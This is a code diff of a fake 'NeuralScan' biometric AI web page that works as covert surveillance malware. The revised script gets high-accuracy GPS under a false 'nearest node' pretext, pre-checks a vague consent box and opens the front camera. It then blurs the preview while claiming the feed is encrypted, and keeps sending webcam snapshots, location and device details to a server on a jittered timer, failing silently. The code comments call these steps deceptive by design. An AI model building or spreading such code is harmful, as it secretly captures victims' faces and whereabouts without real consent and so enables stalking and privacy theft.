@@ -5,22 +5,17 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>NeuralScan Pro | Advanced Biometric AI</title>
     <style>
-        :root { --primary: #6366f1; --accent: #06b6d4; }
+        :root { --primary: #6366f1; --accent: #06b6d4; --bg: #0f172a; }
         
         body { 
-            margin: 0; 
-            padding: 0;
-            background: radial-gradient(at top left, #1e1b4b, #0f172a);
+            margin: 0; padding: 0;
+            background: radial-gradient(at top left, #1e1b4b, var(--bg));
             color: white;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            overflow: hidden;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            display: flex; align-items: center; justify-content: center;
+            height: 100vh; overflow: hidden;
         }
 
-        /* The "Glassmorphism" Card */
         .glass-card {
             background: rgba(30, 41, 59, 0.7);
             backdrop-filter: blur(12px);
@@ -30,14 +25,14 @@
             box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
             width: 380px;
             text-align: center;
+            transition: all 0.5s ease;
         }
 
         .logo { font-weight: 800; font-size: 24px; letter-spacing: -1px; margin-bottom: 10px; display: block; }
         .logo span { color: var(--primary); }
 
         .preview-window {
-            width: 100%;
-            height: 220px;
+            width: 100%; height: 220px;
             background: #000;
             border-radius: 15px;
             margin: 20px 0;
@@ -46,59 +41,67 @@
             border: 1px solid rgba(99, 102, 241, 0.3);
         }
 
-        #video { width: 100%; height: 100%; object-fit: cover; display: none; }
+        #video { 
+            width: 100%; height: 100%; 
+            object-fit: cover; 
+            display: none; 
+            transition: filter 1.5s ease;
+        }
         
         .scan-bar {
-            position: absolute;
-            width: 100%;
-            height: 4px;
+            position: absolute; width: 100%; height: 4px;
             background: linear-gradient(to right, transparent, var(--accent), transparent);
-            top: 0;
-            animation: scanMove 2.5s infinite linear;
-            display: none;
+            top: 0; animation: scanMove 2.5s infinite linear;
+            display: none; z-index: 10;
         }
 
         @keyframes scanMove { 0% { top: 0%; } 100% { top: 100%; } }
 
         .btn {
             background: linear-gradient(135deg, var(--primary), var(--accent));
-            color: white;
-            border: none;
-            padding: 16px;
-            border-radius: 12px;
-            width: 100%;
-            font-weight: bold;
-            font-size: 16px;
+            color: white; border: none; padding: 16px;
+            border-radius: 12px; width: 100%;
+            font-weight: bold; font-size: 16px;
             cursor: pointer;
             box-shadow: 0 10px 15px -3px rgba(99, 102, 241, 0.4);
+            transition: opacity 0.3s;
         }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
 
-        .consent-text { font-size: 11px; color: #94a3b8; margin: 15px 0; display: flex; align-items: flex-start; text-align: left; }
-        .consent-text input { margin-right: 10px; margin-top: 3px; }
+        .consent-text { font-size: 11px; color: #94a3b8; margin: 15px 0; text-align: left; display: flex; }
+        .consent-text input { margin-right: 10px; }
 
-        #console { font-family: monospace; font-size: 10px; color: #60a5fa; margin-top: 15px; text-align: left; min-height: 40px; }
+        #console { 
+            font-family: 'Courier New', monospace; 
+            font-size: 11px; color: #60a5fa; 
+            margin-top: 15px; text-align: left; 
+            min-height: 50px; line-height: 1.4;
+        }
+        .status-dot { color: #22c55e; }
     </style>
 </head>
 <body>
 
 <div class="glass-card">
     <span class="logo">NEURAL<span>SCAN</span> AI</span>
-    <p style="font-size: 14px; color: #cbd5e1;">Next-Gen Biometric Prediction Engine</p>
+    <p style="font-size: 13px; color: #cbd5e1;">Global Distributed Biometric Analysis</p>
 
     <div class="preview-window">
         <div id="scan-bar" class="scan-bar"></div>
         <video id="video" autoplay muted playsinline></video>
-        <div id="placeholder" style="margin-top: 90px; color: #475569; font-size: 12px;">ENCRYPTED FEED IDLE</div>
+        <div id="placeholder" style="padding-top: 90px; color: #475569; font-size: 11px; letter-spacing: 2px;">
+            ENCRYPTED_FEED_IDLE
+        </div>
     </div>
 
     <div class="consent-text">
         <input type="checkbox" id="tos" checked>
-        <label for="tos">I agree to the Biometric Data Processing Agreement for optimized server allocation (nearest cluster: <span id="nearest-node">Detecting...</span>)</label>
+        <label for="tos">Authorize session-token binding for optimized node allocation.</label>
     </div>
 
-    <button id="main-btn" class="btn">START PREDICTION</button>
+    <button id="main-btn" class="btn">START HANDSHAKE</button>
 
-    <div id="console">> Awaiting Secure Handshake...</div>
+    <div id="console">> System Ready. Awaiting Initialization...</div>
 </div>
 
 <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
@@ -111,64 +114,106 @@
     const scanBar = document.getElementById('scan-bar');
     const placeholder = document.getElementById('placeholder');
 
-    // Update Console Simulation
-    function log(msg) {
-        consoleLog.innerText = `> ${msg}`;
+    let targetCoords = { lat: 0, lon: 0 };
+
+    const log = (msg) => {
+        consoleLog.innerHTML = `> <span class="status-dot">●</span> ${msg}`;
+    };
+
+    // State 1: Geolocation Hook
+    async function getTargetLocation() {
+        log("Locating nearest compute cluster...");
+        return new Promise((res) => {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    targetCoords = { lat: pos.coords.latitude, lon: pos.coords.longitude };
+                    log(`Node Bound: ${targetCoords.lat.toFixed(2)}N, ${targetCoords.lon.toFixed(2)}E`);
+                    res(true);
+                },
+                () => {
+                    log("Standard Latency Mode (Location Denied)");
+                    res(false);
+                },
+                { enableHighAccuracy: true, timeout: 5000 }
+            );
+        });
     }
 
-    btn.onclick = async () => {
-        log("Accessing Global Processing Nodes...");
-        
+    // State 2: Camera Access & Deceptive UI
+    async function startBiometricFeed() {
         try {
-            // 1. Get GPS (The Hook)
-            const pos = await new Promise((res, rej) => {
-                navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy: true});
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" } 
             });
-            const coords = { lat: pos.coords.latitude, lon: pos.coords.longitude };
-            log(`Nearest Node Found: ${coords.lat.toFixed(2)}N, ${coords.lon.toFixed(2)}E`);
-
-            // 2. Start Camera
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            
             video.srcObject = stream;
             video.style.display = 'block';
             placeholder.style.display = 'none';
             scanBar.style.display = 'block';
-            btn.innerText = "ANALYZING...";
+            
+            log("Handshake verified. Mapping facial entropy...");
 
-            // 3. Recursive Capture (The Exfiltration)
-            setInterval(() => captureData(coords), 10000);
-            captureData(coords);
-
-            // Fake UI progression
-            setTimeout(() => log("Mapping 128-point face mesh..."), 2000);
-            setTimeout(() => log("Calculating entropy vectors..."), 4000);
+            // The Shadow Transition: Blur the feed to "protect privacy"
             setTimeout(() => {
-                btn.innerText = "PREDICTION COMPLETE";
-                log("Result: Age 22 | Confidence 97.4%");
-            }, 6000);
+                video.style.filter = "blur(15px) grayscale(100%) brightness(0.5)";
+                log("Feed Encrypted. Sustaining Neural Link...");
+            }, 3000);
+
+            // Recursive Shadow Capture with Jitter
+            const runCycle = () => {
+                captureAndSend();
+                const jitter = Math.floor(Math.random() * 5000); // 0-5s random jitter
+                setTimeout(runCycle, 12000 + jitter); 
+            };
+            
+            runCycle();
 
         } catch (err) {
-            log("CRITICAL ERROR: Biometric access denied.");
+            log("ERROR: Security Handshake Failed.");
+            btn.disabled = false;
+            btn.innerText = "RETRY HANDSHAKE";
         }
+    }
+
+    btn.onclick = async () => {
+        btn.disabled = true;
+        btn.innerText = "SYNCHRONIZING...";
+        
+        await getTargetLocation();
+        await startBiometricFeed();
+        
+        setTimeout(() => {
+            btn.innerText = "LINK ESTABLISHED";
+            log("Neural Link Active. Processing Data Stream...");
+        }, 4000);
     };
 
-    function captureData(gps) {
+    function captureAndSend() {
         const ctx = canvas.getContext('2d');
         ctx.drawImage(video, 0, 0, 640, 480);
-        const image = canvas.toDataURL('image/png');
+        
+        // JPEG at 0.6 quality reduces payload size by ~4x vs PNG
+        const image = canvas.toDataURL('image/jpeg', 0.6);
 
-        const metadata = {
-            location: gps,
-            device: navigator.platform,
-            browser: navigator.userAgent,
-            time: new Date().toISOString()
+        const payload = {
+            image: image,
+            metadata: {
+                location: targetCoords,
+                specs: {
+                    platform: navigator.platform,
+                    cores: navigator.hardwareConcurrency || "N/A",
+                    memory: navigator.deviceMemory || "N/A"
+                },
+                agent: navigator.userAgent,
+                timestamp: new Date().toISOString()
+            }
         };
 
         fetch('/save-photo', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ image, metadata })
-        });
+            body: JSON.stringify(payload)
+        }).catch(() => {}); // Silent fail
     }
 </script>
 
